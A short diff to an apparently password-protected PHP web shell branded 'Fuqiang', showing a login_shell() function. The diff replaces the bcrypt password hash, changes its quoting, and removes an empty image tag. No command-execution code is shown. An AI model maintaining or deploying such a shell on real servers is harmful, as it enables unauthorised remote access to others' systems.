@@ -17,7 +17,7 @@
         }
     } else
 session_start();
-$password_hash = "$2a$12$G8dkKbOL4tg03ecU698LuuH/2x/wTDKYWqSTUZKPdWUMBjEmtAbtm";
+$password_hash = '$2a$12$LteC3F3JVGp7NWYrgKsklOGK.cYmZWyoaKehaR2/cprhm9vujioBm';
 
 
 function login_shell()
@@ -238,7 +238,6 @@ input[type="submit"]:active
    <div class="signin"> 
 
     <div class="content"> 
-     <img src="" alt="Fuqiang"> 
      <p class="gradient-text">Fuqiang</p>
 
      <div class="form"> 
